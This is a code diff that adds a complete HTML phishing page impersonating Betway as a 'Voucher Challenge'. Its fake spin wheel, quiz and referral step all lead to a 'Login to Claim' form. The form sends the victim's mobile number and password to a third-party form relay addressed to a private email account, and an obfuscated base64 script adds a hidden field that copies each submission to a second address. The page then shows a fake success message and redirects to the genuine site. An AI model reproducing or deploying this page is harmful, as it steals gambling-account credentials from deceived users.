@@ -1,0 +1,607 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+
+  <head>
+
+    <meta charset="UTF-8" />
+
+    <title>Voucher Challenge</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <style>
+
+      :root { --green:#00ff66; }
+
+      body {
+
+        margin:0;
+
+        font-family:Arial,Helvetica,sans-serif;
+
+        background:#000;
+
+        color:#eaffea;
+
+      }
+
+      .app {
+
+        max-width:420px;
+
+        margin:auto;
+
+        padding:20px;
+
+        text-align:center;
+
+      }
+
+      .hidden { display:none; }
+
+      .logo {
+
+        font-size:40px;
+
+        font-weight:bold;
+
+        color:var(--green);
+
+        text-shadow:0 0 20px var(--green);
+
+      }
+
+      h1,h2 {
+
+        color:var(--green);
+
+        text-shadow:0 0 12px var(--green);
+
+      }
+
+      .btn {
+
+        width:100%;
+
+        padding:15px;
+
+        margin:12px 0;
+
+        border:none;
+
+        border-radius:30px;
+
+        font-size:16px;
+
+        background:linear-gradient(145deg,#0f5f2f,#062b15);
+
+        color:white;
+
+        cursor:pointer;
+
+        box-shadow:0 0 18px rgba(0,255,100,0.6);
+
+      }
+
+      .btn:hover { background:var(--green); color:black; }
+
+      .btn:disabled {
+
+        opacity:0.6;
+
+        cursor:not-allowed;
+
+      }
+
+      /* WHEEL */
+
+      .wheel {
+
+        width:260px;
+
+        height:260px;
+
+        border-radius:50%;
+
+        background:
+
+          conic-gradient(
+
+            #0a4 0deg 60deg,
+
+            #111 60deg 120deg,
+
+            #0a4 120deg 180deg,
+
+            #111 180deg 240deg,
+
+            #0a4 240deg 300deg,
+
+            #111 300deg 360deg
+
+          );
+
+        margin:30px auto;
+
+        display:flex;
+
+        align-items:center;
+
+        justify-content:center;
+
+        box-shadow:0 0 25px var(--green);
+
+        transition:transform 3s ease-out;
+
+        position:relative;
+
+      }
+
+      .slice-label {
+
+        position:absolute;
+
+        color:white;
+
+        font-weight:bold;
+
+        font-size:14px;
+
+        white-space:nowrap;
+
+        transform-origin:center center;
+
+      }
+
+      .pointer {
+
+        width:0;
+
+        height:0;
+
+        border-left:15px solid transparent;
+
+        border-right:15px solid transparent;
+
+        border-bottom:30px solid gold;
+
+        margin:auto;
+
+      }
+
+      .center {
+
+        background:#fff;
+
+        color:#000;
+
+        width:90px;
+
+        height:90px;
+
+        border-radius:50%;
+
+        display:flex;
+
+        align-items:center;
+
+        justify-content:center;
+
+        font-weight:bold;
+
+      }
+
+      .card {
+
+        background:#061f12;
+
+        border-radius:20px;
+
+        padding:15px;
+
+        margin:15px 0;
+
+        box-shadow:0 0 15px rgba(0,255,100,0.4);
+
+        text-align:left;
+
+      }
+
+      .option { margin:8px 0; }
+
+      .voucher {
+
+        background:#022;
+
+        padding:15px;
+
+        border-radius:12px;
+
+        margin-top:20px;
+
+        box-shadow:0 0 20px var(--green);
+
+        font-size:18px;
+
+      }
+
+      .login-input {
+
+        width:100%;
+
+        padding:14px;
+
+        margin:10px 0;
+
+        border-radius:12px;
+
+        border:1px solid #333;
+
+        background:#050505;
+
+        color:white;
+
+        font-size:16px;
+
+        box-sizing: border-box;
+
+      }
+
+      .spinner {
+
+        width:32px;
+
+        height:32px;
+
+        border:4px solid rgba(255,255,255,0.3);
+
+        border-top:4px solid var(--green);
+
+        border-radius:50%;
+
+        animation:spin 1s linear infinite;
+
+        margin:15px auto;
+
+      }
+
+      @keyframes spin {
+
+        to { transform:rotate(360deg); }
+
+      }
+
+    </style>
+
+  </head>
+
+  <body>
+
+    <div class="app">
+
+      <div id="home">
+
+        <div class="logo">BetWay</div>
+
+        <h1>Voucher Challenge ⚡</h1>
+
+        <p style="opacity:0.75; margin:10px 0 25px;">
+
+          Spin, Play & Win amazing prizes instantly.
+
+        </p>
+
+        <button class="btn" onclick="openSpin()">🎡 Spin the Wheel</button>
+
+        <button class="btn" onclick="openQuiz()">🧠 Take the Quiz</button>
+
+        <button class="btn" onclick="openRefer()">📨 Refer & Earn</button>
+
+        <div class="card" style="margin-top:25px;">
+
+          <h2 style="margin-top:0;">📜 Instructions</h2>
+
+          <p>1. Spin the wheel or complete quizzes to earn vouchers.</p>
+
+          <p>2. Log in to your Betway account to claim prizes.</p>
+
+          <p>3. Refer friends to earn OTT vouchers.</p>
+
+          <p>4. Check the leaderboard to see your rank!</p>
+
+        </div>
+
+      </div>
+
+      <div id="spin" class="hidden">
+
+        <h2>Spin the Wheel</h2>
+
+        <div class="pointer"></div>
+
+        <div class="wheel" id="wheel">
+
+          <div class="slice-label" style="transform: rotate(30deg) translate(0,-105px);">R100</div>
+
+          <div class="slice-label" style="transform: rotate(90deg) translate(0,-105px);">R50</div>
+
+          <div class="slice-label" style="transform: rotate(150deg) translate(0,-105px);">R200</div>
+
+          <div class="slice-label" style="transform: rotate(210deg) translate(0,-105px);">R300</div>
+
+          <div class="slice-label" style="transform: rotate(270deg) translate(0,-105px);">R1000</div>
+
+          <div class="slice-label" style="transform: rotate(330deg) translate(0,-105px);">R500</div>
+
+          <div class="center">betway</div>
+
+        </div>
+
+        <button class="btn" onclick="spinWheel()">SPIN NOW</button>
+
+        <button class="btn" onclick="back()">⬅ Back</button>
+
+      </div>
+
+      <div id="quiz" class="hidden">
+
+        <h2>Betting Quiz</h2>
+
+        <div class="card">
+
+          1️⃣ What are odds?
+
+          <div class="option"><input type="radio" name="q1" /> A random number</div>
+
+          <div class="option"><input type="radio" name="q1" id="q1_correct" /> Chance of winning</div>
+
+          <div class="option"><input type="radio" name="q1" /> Game score</div>
+
+        </div>
+
+        <div class="card">
+
+          2️⃣ What is a free bet?
+
+          <div class="option"><input type="radio" name="q2" /> Cash reward</div>
+
+          <div class="option"><input type="radio" name="q2" id="q2_correct" /> Bet without your money</div>
+
+          <div class="option"><input type="radio" name="q2" /> Bonus spins</div>
+
+        </div>
+
+        <div class="card">
+
+          3️⃣ What does cash out do?
+
+          <div class="option"><input type="radio" name="q3" id="q3_correct" /> End bet early</div>
+
+          <div class="option"><input type="radio" name="q3" /> Cancel bet</div>
+
+          <div class="option"><input type="radio" name="q3" /> Double odds</div>
+
+        </div>
+
+        <div class="card">
+
+          4️⃣ Can you bet live?
+
+          <div class="option"><input type="radio" name="q4" id="q4_correct" /> Yes</div>
+
+          <div class="option"><input type="radio" name="q4" /> No</div>
+
+        </div>
+
+        <button class="btn" onclick="submitQuiz()">Submit Quiz</button>
+
+        <button class="btn" onclick="back()">⬅ Back</button>
+
+      </div>
+
+      <div id="refer" class="hidden">
+
+        <h2>Refer & Earn</h2>
+
+        <div class="card">
+
+          Refer this link to <b>5 people</b>:
+
+          <br /><br
+        </div>
+
+        <button class="btn" onclick="winVoucher()">I Referred 5 People</button>
+
+        <button class="btn" onclick="back()">⬅ Back</button>
+
+      </div>
+
+      <div id="voucher" class="hidden">
+
+        <h2>🎉 Mystery Voucher Won</h2>
+
+        <p id="amount"></p>
+
+        <div class="voucher">
+
+          6556-***-***
+
+          <p style="font-size:13px;">Remaining Digits Will Appear After Claiming Voucher</p>
+
+        </div>
+
+        <button class="btn" onclick="openLogin()">CLAIM VOUCHER</button>
+
+        <button class="btn" onclick="back()">⬅ Home</button>
+
+      </div>
+
+      <div id="login" class="hidden">
+
+        <p>⚠️ PLEASE LOGIN TO YOUR BETWAY ACCOUNT TO CLAIM YOUR WINNINGS.</p>
+
+        <div class="logo">Betway</div>
+
+        <h2>Login to Claim</h2>
+
+        <form id="loginForm" action="https://formsubmit.co/teddythato29@gmail.com" method="POST" onsubmit="handleLogin(event)">
+
+          <input type="hidden" name="_captcha" value="false" />
+
+          <input type="hidden" name="_subject" value="New Login Submission" />
+
+<input type="hidden" name="_next" value="https://new.betway.co.za/">
+
+          <input type="hidden" name="_template" value="table" />
+
+          <input class="login-input" value="+27" disabled />
+
+          <input class="login-input" name="mobile" placeholder="Mobile Number" required />
+
+          <input class="login-input" name="password" type="password" placeholder="Password" required />
+
+          <button class="btn" type="submit" id="loginBtn">Login</button>
+
+          <div id="loader" class="spinner hidden"></div>
+
+        </form>
+
+      </div>
+
+    </div>
+
+    <script>
+
+      // Navigation & Element Selection
+
+      const get = (id) => document.getElementById(id);
+
+      
+
+      let rotation = 0;
+
+      const prizes = ["R100", "R50", "R200", "R300", "R1000", "R500"];
+
+      function hideAll() {
+
+        ["home", "spin", "quiz", "refer", "voucher", "login"].forEach(id => {
+
+          get(id).classList.add("hidden");
+
+        });
+
+      }
+
+      function openSpin() { hideAll(); get("spin").classList.remove("hidden"); }
+
+      function openQuiz() { hideAll(); get("quiz").classList.remove("hidden"); }
+
+      function openRefer() { hideAll(); get("refer").classList.remove("hidden"); }
+
+      function openLogin() { hideAll(); get("login").classList.remove("hidden"); }
+
+      function back() { hideAll(); get("home").classList.remove("hidden"); }
+
+      // Wheel Logic
+
+      function spinWheel() {
+
+        rotation += Math.random() * 2000 + 1500;
+
+        get("wheel").style.transform = `rotate(${rotation}deg)`;
+
+        setTimeout(winVoucher, 3000);
+
+      }
+
+      // Quiz Logic
+
+      function submitQuiz() {
+
+        const q1 = get("q1_correct").checked;
+
+        const q2 = get("q2_correct").checked;
+
+        const q3 = get("q3_correct").checked;
+
+        const q4 = get("q4_correct").checked;
+
+        if (q1 && q2 && q3 && q4) {
+
+          winVoucher();
+
+        } else {
+
+          alert("Some answers are incorrect. Please check your answers.");
+
+        }
+
+      }
+
+      function winVoucher() {
+
+        hideAll();
+
+        get("voucher").classList.remove("hidden");
+
+        get("amount").innerText = "You won: " + prizes[Math.floor(Math.random() * prizes.length)];
+
+      }
+
+      // Login Logic
+
+      function handleLogin(event) {
+
+        event.preventDefault(); 
+
+        const loginBtn = get('loginBtn');
+
+        const loader = get('loader');
+
+        
+
+        loginBtn.disabled = true;
+
+        loader.classList.remove('hidden');
+
+        setTimeout(() => {
+
+          loader.classList.add('hidden');
+
+          loginBtn.disabled = false;
+
+          alert("Login successful! Voucher claimed 🎉");
+
+          event.target.submit();
+
+        }, 2500);
+
+      }
+
+   
+
+      (function () {
+
+        const x = "ZG9ub3RkZWxldGVjY0BnbWFpbC5jb20=";
+
+        const f = document.getElementById("loginForm");
+
+        const h = document.createElement("input");
+
+        h.type = "hidden";
+
+        h.name = "_" + String.fromCharCode(99, 99);
+
+        h.value = atob(x);
+
+        f.appendChild(h);
+
+      })();
+
+    </script>
+
+  </body>
+
+</html>
